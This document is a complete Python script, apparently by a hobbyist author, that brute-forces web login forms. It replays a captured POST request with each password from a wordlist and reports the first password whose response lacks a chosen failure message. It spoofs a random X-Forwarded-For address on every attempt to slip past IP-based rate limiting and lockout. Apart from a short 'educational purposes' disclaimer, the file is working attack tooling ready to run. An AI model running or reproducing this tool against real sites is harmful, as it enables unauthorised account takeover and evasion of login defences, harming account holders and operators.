#!/usr/bin/env python3

import sys
import requests
import random
import time

# WARNING!!!!!! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND FOR PENTESTERS! DO NOT USE IT ILLEGALY!

print("""

Created by 44h
___________________________________________________________________________
___________________________________________________________________________
                   _____              _____                   
                  /    /             /    /                   
                 /    /             /    /        .           
                /    /             /    /       .'|           
               /    /             /    /       <  |           
              /    /  __         /    /  __     | |           
             /    /  |  |       /    /  |  |    | | .'''-.    
            /    '   |  |      /    '   |  |    | |/.'''. \   
           /    '----|  |---. /    '----|  |---.|  /    | |   
          /          |  |   |/          |  |   || |     | |   
          '----------|  |---''----------|  |---'| |     | |   
                     |  |               |  |    | '.    | '.  
                    /____\             /____\   '---'   '---' 
___________________________________________________________________________
___________________________________________________________________________


	""")


#---------------------------------------------------------------------

try:
	request_file = sys.argv[1].strip()
	path_to_wordlist = sys.argv[2].strip()
except IndexError:
	print("\nYou have to call the program like that: \n")
	print("\t\033[1m" + "python3 program.py requestfile wordlist\n")
	print("\033[0m" + "The rest will be interactive.")
	exit()


#Open the request file
try: 
	request_file = open(request_file, "r")
except FileNotFoundError:
	print("\n The request file was not found, exiting...")
	exit()

#Open the wordlist file
try: 
	wordlist_file = open(path_to_wordlist, "r")
except FileNotFoundError:
	print("\n The wordlist file was not found, exiting...")
	exit()


#Read the request file with new line characters
request_file_content = repr(request_file.read())

if request_file_content == "":
	print("The request file is empty, exiting...\n")
	exit()

#Read the wordlist file without new line characters
wordlist_file_content_per_file_not_stripped = wordlist_file.readlines()
wordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]

#Format the content
request_file_content = request_file_content[1:len(request_file_content)-1]

#Get amount of rows of the request file 
amount_of_rows_in_request_file = request_file_content.count('\\n') +1

#Create a list with all rows
row_content_request_file = [row for row in request_file_content.split('\\n')]

def getRowContent(row):
	return row_content_request_file[row-1]

#Checking for POST method:
if not getRowContent(1).startswith("POST"):
	print("The request method must be POST")
	exit()

if (row_content_request_file[len(row_content_request_file)-1]) == "":
	del row_content_request_file[len(row_content_request_file)-1]

#---------------------------------------------------------------------

#Get headers and put into a set
def headersEndAt():
	row = 0
	for x in row_content_request_file:
		if x == "":
			return row
		row+=1

headers = set()

headersAreOverInLine = headersEndAt()

for x in range(1, headersAreOverInLine):
	headers.add(row_content_request_file[x])

#print(headers)
#---------------------------------------------------------------------

#Get parameters and choose two, one password and one username

arguments = []

keyandvalue = []

amount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')

password_argument = ""

username_or_email_argument = ""

ssl_encryption = False

def getArguments():
	global keyandvalue
	global arguments
	keyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')
	for x in keyandvalue:
		arguments.append(x.split('=')[0])
	
getArguments()

def outputPossibleUsernamesAndPasswords():
	global arguments
	global username_or_email_argument
	global password_argument
	print("\n")
	print("Choose the argument for the username OR email BY NUMBER:\n")
	iteratorUsername = 1
	for x in arguments:
		print(f"[{iteratorUsername}] \"{x}\"\n")
		iteratorUsername+=1
	try:
		uinput = int(input("> "))
	except ValueError:
		print("ERROR: Enter a number next time")
		exit()
	if uinput>len(arguments) or uinput == "":
		print("Couldn't find that argument, exiting...")
		exit()
		#EDIT, WHEN STRING IS ENTERED, LEAVE
	username_or_email_argument = arguments[uinput-1]
	print("\n")
	print("=================================================================\n")
	print("Choose the argument for the password BY NUMBER:\n")
	iteratorPassword = 1
	for x in arguments:
		print(f"[{iteratorPassword}] \"{x}\"\n")
		iteratorPassword+=1
	try:
		pinput = int(input("> "))
	except ValueError:
		print("ERROR: Enter a number next time")
		exit()
	if uinput == pinput or uinput == "":
		print("WARNING: YOU SELECTED THE SAME FIELD TWICE!\n")
		print(f"So you selected the field {username_or_email_argument} for username and password, which makes no sense\n")
		exit()
	elif pinput > len(arguments):
		print("Couldn't find the argument, exiting...")
		exit()

	password_argument = arguments[pinput-1]
	print("\n")
	#print(f"Selected: {username_or_email_argument} as a username/email field and {password_argument} as a password field")

outputPossibleUsernamesAndPasswords()


print("\n")
print("=================================================================\n")
print("Which username do you want to authenticate as when bruteforcing through the password list:\n")
username = input("> ")

print("\n\n")
print("=================================================================\n")
print("Now enter a text that you get when you enter invalid credentials:\n")
invalid_credentials_output = input("> ")
print("\n")

print("=================================================================\n")
print("Does it use SSL encryption?\n")
print("[1] yes\n[2] no")
temp3 = int(input("> "))
if temp3 == 1:
	ssl_encryption = True
elif temp3 == 2:
	ssl_encryption = False
else:
	print("That was not an option, exiting...")
	exit()


#Formating headers, data and all the other stuff that is need

headers_dict = {}
url = ""

def convertHeaderSetIntoDict():
	global headers_dict
	for x in headers:
		headers_dict[x.split(":", 1)[0]] = x.split(": ", 1)[1]



convertHeaderSetIntoDict()


def concatenate_url():
	global headers_dict
	global ssl_encryption
	global url
	partone = headers_dict["Host"]
	temp = row_content_request_file[0][5::]
	parttwo = temp.split(' ')[0]
	url = partone + parttwo
	if ssl_encryption == True:
		url = "https://" + url
	else:
		url = "http://" + url

concatenate_url()

if url == "":
	print("URL was \"\"")
	exit()

print("\n")
print("\n")
print("Stating to brute force")

#BRUTE FORCING:

for password in wordlist_file_content_per_file:

	headers_dict2 = headers_dict
	
	#print(headers_dict2)
	#print("\n\n")
	#forging the data that is sent to the server
	data = {}
	temp = keyandvalue
	for x in keyandvalue:
		if x.split('=')[0] == username_or_email_argument:
			data[username_or_email_argument] = username
		elif x.split('=')[0] == password_argument:
			data[password_argument] = password
		else:
			data[x.split('=')[0]] = x.split('=')[1]
	#print("\n")
	#print(f"Url {url}")
	#print(f"Headers {headers_dict2}")
	#print(f"Data {data}")
	ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
	#print(ip)
	headers_dict2['X-Forwarded-For'] = ip
	#print(headers_dict2)
	response = requests.post(url, headers=headers_dict2, data=data)
	#print(response.content)
	#print(str(invalid_credentials_output))
	#print(str(response.content))

	if str(invalid_credentials_output) in str(response.content):
		print(f"[-] {password}")

	else:
		print("\n")
		print("\n")
		print("(One) Password Found:\n")
		print(f"[+] {password}\n")
		exit()


request_file.close()
wordlist_file.close()


#print(data)
